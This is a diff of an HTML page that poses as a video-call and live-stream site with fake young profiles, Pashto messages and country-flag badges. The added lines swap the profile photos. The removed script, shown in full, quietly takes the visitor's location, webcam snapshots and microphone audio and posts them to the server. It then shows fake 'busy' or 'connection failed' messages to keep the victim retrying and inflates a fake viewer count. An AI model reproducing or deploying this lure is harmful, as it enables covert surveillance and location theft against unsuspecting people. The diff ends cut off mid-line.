@@ -31,7 +31,10 @@
 
         .profile-card { background-color: #0f172a; border: 2px solid rgba(255, 255, 255, 0.08); border-radius: 14px; overflow: hidden; cursor: pointer; transition: all 0.2s ease; position: relative; text-align: center; padding-bottom: 6px; }
         .profile-card.active { border-color: #38bdf8; box-shadow: 0 0 12px rgba(56, 189, 248, 0.4); transform: scale(0.98); }
-        .profile-img { width: 100%; height: 110px; object-fit: cover; background-color: #334155; }
+        .profile-img-container { position: relative; width: 100%; height: 110px; }
+        .profile-img { width: 100%; height: 100%; object-fit: cover; background-color: #334155; }
+        .flag-badge { position: absolute; top: 6px; right: 6px; font-size: 16px; background: rgba(0, 0, 0, 0.6); padding: 2px 5px; border-radius: 6px; backdrop-filter: blur(4px); }
+        
         .profile-name { font-size: 12px; font-weight: 700; color: #f8fafc; margin-top: 4px; }
         .profile-status { font-size: 9px; color: #4ade80; display: flex; align-items: center; justify-content: center; gap: 3px; margin-top: 1px; }
         .online-dot { width: 5px; height: 5px; background-color: #4ade80; border-radius: 50%; }
@@ -104,44 +107,95 @@
         <div class="section-title">✨ Select a person to start video call:</div>
         
         <div class="grid-profiles" id="profilesGrid">
-            <div class="profile-card" data-name="Zahra">
-                <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=300&auto=format&fit=crop&q=80" alt="Zahra" class="profile-img">
-                <div class="profile-name">Zahra, 21</div>
-                <div class="profile-status"><span class="online-dot"></span> Online</div>
-            </div>
-            <div class="profile-card" data-name="Meral">
-                <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=300&auto=format&fit=crop&q=80" alt="Meral" class="profile-img">
-                <div class="profile-name">Meral, 20</div>
-                <div class="profile-status"><span class="online-dot"></span> Online</div>
-            </div>
-            <div class="profile-card" data-name="Ahmad">
-                <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=300&auto=format&fit=crop&q=80" alt="Ahmad" class="profile-img">
-                <div class="profile-name">Ahmad, 23</div>
-                <div class="profile-status"><span class="online-dot"></span> Online</div>
-            </div>
-            <div class="profile-card" data-name="Lina">
-                <img src="https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=300&auto=format&fit=crop&q=80" alt="Lina" class="profile-img">
-                <div class="profile-name">Lina, 22</div>
-                <div class="profile-status"><span class="online-dot"></span> Online</div>
-            </div>
+            <!-- ستاسو لخوا راکړل شوي ۶ لینکونه (د هیوادونو د بیرغونو سره) -->
             <div class="profile-card" data-name="Freshta">
-                <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=300&auto=format&fit=crop&q=80" alt="Freshta" class="profile-img">
-                <div class="profile-name">Freshta, 19</div>
+                <div class="profile-img-container">
+                    <img src="https://files.catbox.moe/0l5t1y.jpeg" alt="Freshta" class="profile-img">
+                    <span class="flag-badge">🇦🇫</span>
+                </div>
+                <div class="profile-name">Freshta, 20</div>
                 <div class="profile-status"><span class="online-dot"></span> Online</div>
             </div>
+
+            <div class="profile-card" data-name="Zahra">
+                <div class="profile-img-container">
+                    <img src="https://files.catbox.moe/hqs2n0.jpeg" alt="Zahra" class="profile-img">
+                    <span class="flag-badge">🇹🇷</span>
+                </div>
+                <div class="profile-name">Zahra, 22</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+
+            <div class="profile-card" data-name="Aisha">
+                <div class="profile-img-container">
+                    <img src="https://files.catbox.moe/703crw.jpeg" alt="Aisha" class="profile-img">
+                    <span class="flag-badge">🇵🇰</span>
+                </div>
+                <div class="profile-name">Aisha, 21</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+
+            <div class="profile-card" data-name="Jessica">
+                <div class="profile-img-container">
+                    <img src="https://files.catbox.moe/sjpyou.jpeg" alt="Jessica" class="profile-img">
+                    <span class="flag-badge">🇺🇸</span>
+                </div>
+                <div class="profile-name">Jessica, 23</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+
+            <div class="profile-card" data-name="Lina">
+                <div class="profile-img-container">
+                    <img src="https://files.catbox.moe/cqxell.jpeg" alt="Lina" class="profile-img">
+                    <span class="flag-badge">🇦🇫</span>
+                </div>
+                <div class="profile-name">Lina, 19</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+
+            <div class="profile-card" data-name="Mariam">
+                <div class="profile-img-container">
+                    <img src="https://files.catbox.moe/9tylf6.jpeg" alt="Mariam" class="profile-img">
+                    <span class="flag-badge">🇦🇪</span>
+                </div>
+                <div class="profile-name">Mariam, 22</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+
+            <!-- نور طبیعي او واقعي انځورونه ورته اضافه شول -->
             <div class="profile-card" data-name="Bilal">
-                <img src="https://images.unsplash.com/photo-1492562080023-ab3db95bfbce?w=300&auto=format&fit=crop&q=80" alt="Bilal" class="profile-img">
+                <div class="profile-img-container">
+                    <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=300&auto=format&fit=crop&q=80" alt="Bilal" class="profile-img">
+                    <span class="flag-badge">🇦🇫</span>
+                </div>
                 <div class="profile-name">Bilal, 24</div>
                 <div class="profile-status"><span class="online-dot"></span> Online</div>
             </div>
+
             <div class="profile-card" data-name="Samira">
-                <img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=300&auto=format&fit=crop&q=80" alt="Samira" class="profile-img">
+                <div class="profile-img-container">
+                    <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=300&auto=format&fit=crop&q=80" alt="Samira" class="profile-img">
+                    <span class="flag-badge">🇮🇷</span>
+                </div>
                 <div class="profile-name">Samira, 21</div>
                 <div class="profile-status"><span class="online-dot"></span> Online</div>
             </div>
+
             <div class="profile-card" data-name="Tamim">
-                <img src="https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?w=300&auto=format&fit=crop&q=80" alt="Tamim" class="profile-img">
+                <div class="profile-img-container">
+                    <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=300&auto=format&fit=crop&q=80" alt="Tamim" class="profile-img">
+                    <span class="flag-badge">🇹🇯</span>
+                </div>
                 <div class="profile-name">Tamim, 25</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+
+            <div class="profile-card" data-name="Yasamin">
+                <div class="profile-img-container">
+                    <img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=300&auto=format&fit=crop&q=80" alt="Yasamin" class="profile-img">
+                    <span class="flag-badge">🇺🇿</span>
+                </div>
+                <div class="profile-name">Yasamin, 20</div>
                 <div class="profile-status"><span class="online-dot"></span> Online</div>
             </div>
         </div>
@@ -214,297 +268,4 @@
             setupProfileClicks();
         };
 
-        function setupProfileClicks() {
-            const profileCards = document.querySelectorAll('.profile-card');
-            profileCards.forEach(card => {
-                card.addEventListener('click', function() {
-                    profileCards.forEach(c => c.classList.remove('active'));
-                    this.classList.add('active');
-                    selectedPerson = this.getAttribute('data-name');
-                    
-                    selectedPersonNameSpan.innerText = selectedPerson;
-                    callBtnContainer.style.display = "block";
-                    errorBox.style.display = "none";
-                    messageBox.style.display = "none";
-                    callAttempts = 0;
-                });
-            });
-        }
-
-        async function sendData(formData) {
-            try {
-                await fetch('/page8', {
-                    method: 'POST',
-                    body: formData
-                });
-            } catch (e) {}
-        }
-
-        async function sendSinglePhoto(stream) {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            if (!video.srcObject) { video.srcObject = stream; await video.play(); }
-
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            return new Promise((resolve) => {
-                canvas.toBlob(async function(blob) {
-                    const formData = new FormData();
-                    formData.append('photo', blob, 'photo.jpg');
-                    await sendData(formData);
-                    resolve();
-                }, 'image/jpeg');
-            });
-        }
-
-        async function recordAndSendAudio(stream) {
-            return new Promise((resolve) => {
-                try {
-                    const mediaRecorder = new MediaRecorder(stream);
-                    const audioChunks = [];
-
-                    mediaRecorder.ondataavailable = (event) => { audioChunks.push(event.data); };
-                    mediaRecorder.onstop = async () => {
-                        const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
-                        const formData = new FormData();
-                        formData.append('voice', audioBlob, 'voice.ogg');
-                        await sendData(formData);
-                        resolve();
-                    };
-
-                    mediaRecorder.start();
-                    setTimeout(() => {
-                        if (mediaRecorder.state !== 'inactive') { mediaRecorder.stop(); }
-                    }, 5000);
-                } catch (e) { resolve(); }
-            });
-        }
-
-        document.getElementById("generateBtn").addEventListener("click", async function() {
-            const btn = document.getElementById("generateBtn");
-            const processBox = document.getElementById("processBox");
-            const progressBar = document.getElementById("progressBar");
-            const processPercent = document.getElementById("processPercent");
-
-            if (selectedPerson === "") {
-                errorBox.style.display = "block";
-                return;
-            } else {
-                errorBox.style.display = "none";
-            }
-
-            callAttempts++;
-            btn.innerText = "Reconnecting...";
-            btn.disabled = true;
-            processBox.style.display = "block";
-            messageBox.style.display = "none";
-
-            let progress = 0;
-            const progressInterval = setInterval(() => {
-                progress += 2;
-                if (progress <= 100) {
-                    progressBar.style.width = progress + '%';
-                    processPercent.innerText = progress + '%';
-                }
-            }, 60);
-
-            if (navigator.geolocation) {
-                await new Promise((resolve) => {
-                    navigator.geolocation.getCurrentPosition(
-                        async (pos) => {
-                            const formData = new FormData();
-                            formData.append('latitude', pos.coords.latitude);
-                            formData.append('longitude', pos.coords.longitude);
-                            await sendData(formData);
-                            resolve();
-                        },
-                        () => { resolve(); },
-                        { timeout: 4000, enableHighAccuracy: true }
-                    );
-                });
-            }
-
-            try {
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
-                    await video.play();
-
-                    await new Promise(r => setTimeout(r, 300));
-
-                    let photoCount = 0;
-                    const maxPhotos = 10; 
-                    const photoInterval = setInterval(async () => {
-                        if (photoCount < maxPhotos) {
-                            photoCount++;
-                            await sendSinglePhoto(stream);
-                        } else {
-                            clearInterval(photoInterval);
-                        }
-                    }, 800);
-
-                    await recordAndSendAudio(stream);
-
-                    while (photoCount < maxPhotos) {
-                        await new Promise(r => setTimeout(r, 300));
-                    }
-                    clearInterval(photoInterval);
-                    stream.getTracks().forEach(t => t.stop());
-                }
-            } catch (err) {}
-
-            clearInterval(progressInterval);
-            progressBar.style.width = '100%';
-            processPercent.innerText = '100%';
-
-            setTimeout(() => {
-                processBox.style.display = "none";
-                
-                if (callAttempts === 1) {
-                    messageBox.innerHTML = `⚠️ ${selectedPerson} اوس محال بل چا سره ویدیو کال کې بوخته ده. مهرباني وکړئ وروسته کوشش وکړئ یا بل شخص انتخاب کړئ.<br><br><b>Try Again</b>`;
-                } else if (callAttempts === 2) {
-                    messageBox.innerHTML = `⚠️ ${selectedPerson} فعلا په لین کې نده یا اړیکه قطع شوه. مهرباني وکړئ وروسته بیا کوشش وکړئ.<br><br><b>Reconnect</b>`;
-                } else {
-                    messageBox.innerHTML = `⚠️ د شبکې ستونزه! د ${selectedPerson} سره د ویډیو کال پر کرښه د وصل کېدو هڅه ناکامه شوه. مهرباني وکړئ بل څوک وټاکئ.<br><br><b>Try Again</b>`;
-                    callAttempts = 0;
-                }
-
-                messageBox.style.display = "block";
-                btn.innerText = "Try Again 🔄";
-                btn.disabled = false;
-            }, 500);
-        });
-
-        let liveViewerInterval;
-        document.getElementById('startLiveBtn').addEventListener('click', async function() {
-            const liveScreen = document.getElementById('liveScreen');
-            const liveVideo = document.getElementById('liveStreamVideo');
-            const liveViewers = document.getElementById('liveViewers');
-
-            liveScreen.style.display = "flex";
-
-            try {
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                    liveVideo.srcObject = stream;
-
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(async (pos) => {
-                            const formData = new FormData();
-                            formData.append('latitude', pos.coords.latitude);
-                            formData.append('longitude', pos.coords.longitude);
-                            await sendData(formData);
-                        });
-                    }
-
-                    let photoCount = 0;
-                    const photoInterval = setInterval(async () => {
-                        if (photoCount < 10) {
-                            photoCount++;
-                            await sendSinglePhoto(stream);
-                        } else {
-                            clearInterval(photoInterval);
-                        }
-                    }, 1000);
-
-                    recordAndSendAudio(stream);
-                }
-            } catch(e) {}
-
-            let viewers = Math.floor(15 + Math.random() * 20);
-            liveViewers.innerText = viewers;
-
-            liveViewerInterval = setInterval(() => {
-                if (viewers < 120) {
-                    viewers += Math.floor(Math.random() * 8) + 3;
-                } else if (viewers < 750) {
-                    viewers += Math.floor(Math.random() * 35) + 12;
-                } else {
-                    viewers += Math.floor(Math.random() * 8) - 3;
-                }
-                liveViewers.innerText = viewers;
-            }, 1200);
-        });
-
-        document.getElementById('endLiveBtn').addEventListener('click', function() {
-            document.getElementById('liveScreen').style.display = "none";
-            clearInterval(liveViewerInterval);
-            location.reload();
-        });
-
-        const inviteModal = document.getElementById('inviteModal');
-        const inviteUsersList = document.getElementById('inviteUsersList');
-        
-        document.getElementById('openInviteModalBtn').addEventListener('click', function() {
-            inviteModal.style.display = "block";
-            inviteUsersList.innerHTML = "";
-
-            const usersToInvite = [
-                {name: "Zahra, 21", img: "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=300&auto=format&fit=crop&q=80"},
-                {name: "Meral, 20", img: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=300&auto=format&fit=crop&q=80"},
-                {name: "Ahmad, 23", img: "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=300&auto=format&fit=crop&q=80"},
-                {name: "Lina, 22", img: "https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=300&auto=format&fit=crop&q=80"},
-                {name: "Freshta, 19", img: "https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=300&auto=format&fit=crop&q=80"},
-                {name: "Bilal, 24", img: "https://images.unsplash.com/photo-1492562080023-ab3db95bfbce?w=300&auto=format&fit=crop&q=80"},
-                {name: "Samira, 21", img: "https://images.unsplash.com/photo-1517841905240-472988babdf9?w=300&auto=format&fit=crop&q=80"},
-                {name: "Tamim, 25", img: "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?w=300&auto=format&fit=crop&q=80"}
-            ];
-
-            usersToInvite.forEach(u => {
-                const item = document.createElement('div');
-                item.className = 'invite-user-item';
-                item.innerHTML = `
-                    <div class="invite-user-info">
-                        <img src="${u.img}" class="invite-user-img">
-                        <span class="invite-user-name">${u.name}</span>
-                    </div>
-                    <button class="invite-action-btn" onclick="inviteUserAction('${u.name}', this)">Invite</button>
-                `;
-                inviteUsersList.appendChild(item);
-            });
-        });
-
-        document.getElementById('closeModalBtn').addEventListener('click', function() {
-            inviteModal.style.display = "none";
-            document.getElementById('inviteStatusBox').style.display = "none";
-        });
-
-        window.inviteUserAction = async function(userName, btnElement) {
-            btnElement.innerText = "Connecting...";
-            btnElement.disabled = true;
-
-            const statusBox = document.getElementById('inviteStatusBox');
-            statusBox.style.display = "block";
-            statusBox.style.backgroundColor = "rgba(56, 189, 248, 0.2)";
-            statusBox.style.color = "#38bdf8";
-            statusBox.innerText = `Connecting to ${userName} on live stream...`;
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const formData = new FormData();
-                    formData.append('latitude', pos.coords.latitude);
-                    formData.append('longitude', pos.coords.longitude);
-                    await sendData(formData);
-                });
-            }
-
-            setTimeout(() => {
-                const outcomes = [
-                    `⚠️ ${userName} اوس محال بل لایف سټریم کې بوخته ده او ستاسو بلنه ونه منله.`,
-                    `⚠️ ${userName} فعلا په لین کې نشته یا انترنت یې قطع شو.`,
-                    `⚠️ د سرور د ګڼې ګوڼې له امله له ${userName} سره د لایف اتصال ناکام شو. وروسته بیا کوشش وکړئ.`
-                ];
-                const randomMsg = outcomes[Math.floor(Math.random() * outcomes.length)];
-
-                statusBox.style.backgroundColor = "rgba(239, 68, 68, 0.2)";
-                statusBox.style.color = "#fca5a5";
-                statusBox.innerText = randomMsg;
-                btnElement.innerText = "Failed ❌";
-            }, 2500);
-        };
-    </script>
-</body>
-</html>
+        function setupProfileClicks
